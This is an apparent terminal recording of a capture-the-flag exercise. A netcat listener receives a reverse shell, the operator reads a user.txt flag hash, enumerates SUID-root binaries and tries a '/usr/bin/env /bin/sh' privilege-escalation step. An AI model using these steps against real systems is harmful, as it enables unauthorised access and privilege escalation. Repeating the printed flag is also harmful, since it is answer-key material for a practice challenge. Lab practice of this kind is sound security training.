@@ -1,0 +1,91 @@
+Script started on 2025-04-06 20:22:33+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 10680
+bash: cannot set terminal process group (1596): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ ls -la[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -la
+[Kls -la[Kls -la[Kls -la
+total 60
+drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
+drwxr-xr-x 3 root        root        4096 May 11  2020 ..
+lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
+drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
+drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
+-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
+drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
+drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
+-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
+-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
+-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
+-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt[Kcat user.txt[Kcat user.txt
+90d6f992585815ff991e68748c414740
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ ls ../[K[K[K/home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls /home
+[Kls /home
+namelessone
+namelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ find / -[K[K[K[K[K[K[K[K[7mfind / -user root -perm /4000 2>/dev/null[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user root -perm /4000 2>/dev/null
+[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null[Kfind / -user root -perm /4000 2>/dev/null
+[K/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+[K/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+[K/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+/bin/su
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+[Knamelessone@anonymous:~$ [Knamelessone@anonymous:~$ [K[?2004hnamelessone@anonymous:~$ [7m/usr/bin/env[27m/usr/bin/env [7m/bin/sh[27m[7m/usr/bin/env [27m/bin/sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/bin/env /bin/sh
+[K/usr/bin/env /bin/sh[K/usr/bin/env /bin/sh[K/usr/bin/env /bin/sh
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+[K
+[?2004l
+Script done on 2025-04-06 20:30:03+03:00 [COMMAND_EXIT_CODE="1"]
